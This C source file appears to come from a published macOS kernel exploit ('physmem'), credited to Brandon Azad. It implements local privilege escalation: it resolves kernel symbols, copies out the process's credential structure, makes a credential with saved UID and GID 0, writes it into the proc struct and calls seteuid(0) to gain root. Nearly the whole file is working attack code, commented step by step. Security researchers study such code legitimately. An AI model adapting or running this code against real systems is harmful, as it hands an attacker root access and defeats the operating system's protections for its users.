/*
 * privilege_escalation.c
 * Brandon Azad
 *
 * Privilege escalation using the physmem exploit.
 *
 * The strategy we use here is designed to be safe and robust. We call the appropriate kernel APIs
 * to allocate a new ucred struct and then set the saved UID and GID to 0. We then replace our
 * current ucred with the new one and release references appropriately. This effectively makes our
 * process setuid 0, and so we can elevate privileges by calling seteuid(0).
 */
#include "privilege_escalation.h"

#include "fail.h"
#include "kernel_image.h"
#include "syscall_hook.h"

#include <unistd.h>

void setuid_root() {
	// Check if we're already root. Otherwise we might panic the system.
	seteuid(0);
	setuid(0);
	setgid(0);
	if (getuid() == 0) {
		return;
	}
	// Resolve the symbols we'll need.
	uint64_t _current_proc           = kernel_symbol("_current_proc");
	uint64_t _copyout                = kernel_symbol("_copyout");
	uint64_t _copyin                 = kernel_symbol("_copyin");
	uint64_t _IOMalloc               = kernel_symbol("_IOMalloc");
	uint64_t _IOFree                 = kernel_symbol("_IOFree");
	uint64_t _kauth_cred_proc_ref    = kernel_symbol("_kauth_cred_proc_ref");
	uint64_t _kauth_cred_setsvuidgid = kernel_symbol("_kauth_cred_setsvuidgid");
	uint64_t _kauth_cred_unref       = kernel_symbol("_kauth_cred_unref");
	// Get a pointer to our proc struct, and copy out the first several words.
	uint64_t proc = kernel_call(_current_proc, 0, 0, 0, 0, 0);
	const unsigned max_idx = 128;
	uint64_t proc_data[max_idx];
	int err = kernel_call(_copyout, proc, (uint64_t)proc_data, sizeof(proc_data), 0, 0);
	if (err) {
		FAIL("copyout failed");
	}
	// Add a reference to our credential structure and get its pointer.
	uint64_t cred = kernel_call(_kauth_cred_proc_ref, proc, 0, 0, 0, 0);
	// Find out the index of the cred pointer in the proc struct.
	unsigned cred_idx = 0;
	for (; cred_idx < max_idx; cred_idx++) {
		if (proc_data[cred_idx] == cred) {
			break;
		}
	}
	if (cred_idx == max_idx) {
		// This means the cred wasn't found in the proc struct. We have no idea where the
		// cred is, so unfortunately we can't pass a pointer to the cred to
		// kauth_cred_unref. We have an extra reference on this cred, but this just means
		// the cred won't be cleaned up when all references are dropped.
		FAIL("could not find kernel credentials in proc struct");
	}
	uint64_t proc_cred_ptr = proc + cred_idx * sizeof(uint64_t);
	// Set the saved UID and GID on the cred to 0. This consumes the reference added in the
	// call to kauth_cred_proc_ref and returns a new credential.
	uint64_t cred0 = kernel_call(_kauth_cred_setsvuidgid, cred, 0, 0, 0, 0);
	// Allocate a pointer in which we can store our current cred to pass to kauth_cred_unref.
	uint64_t cred_ptr = kernel_call(_IOMalloc, sizeof(cred), 0, 0, 0, 0);
	if (cred_ptr == 0) {
		// kauth_cred_setsvuidgid removed a reference on the old cred, so the only thing we
		// need to do is free the new cred. However, we can't allocate memory to pass a
		// pointer to the new cred to kauth_cred_unref. We didn't damage the system, so
		// just accept the fact that we leaked memory.
		FAIL("could not allocate kernel memory");
	}
	// Store a pointer to our old cred in the memory we just allocated.
	err = kernel_call(_copyin, (uint64_t)&cred, cred_ptr, sizeof(cred), 0, 0);
	if (err != 0) {
		// Just like above, we can't pass the new cred to kauth_cred_unref. However, we can
		// free the memory we just allocated.
		kernel_call(_IOFree, cred_ptr, sizeof(cred), 0, 0, 0);
		FAIL("could not write kernel credential pointer into allocated memory");
	}
	// Store the new setuid 0 credentials in our proc.
	err = kernel_call(_copyin, (uint64_t)&cred0, proc_cred_ptr, sizeof(cred0), 0, 0);
	if (err != 0) {
		// We couldn't replace the cred pointer in our proc structure. Ideally we'd free
		// the new (and useless) cred. However, this would require having a pointer to the
		// new cred in the kernel to pass to kauth_cred_unref, which would mean another
		// copyin. Thus, we'll just leak the cred.
		kernel_call(_IOFree, cred_ptr, sizeof(cred), 0, 0, 0);
		FAIL("could not set process credentials");
	}
	// Free the old cred.
	kernel_call(_kauth_cred_unref, cred_ptr, 0, 0, 0, 0);
	kernel_call(_IOFree, cred_ptr, sizeof(cred), 0, 0, 0);
	// Now we are setuid 0. Elevate to root.
	seteuid(0);
	setuid(0);
	setgid(0);
	if (getuid() != 0) {
		FAIL("privilege escalation failed");
	}
}
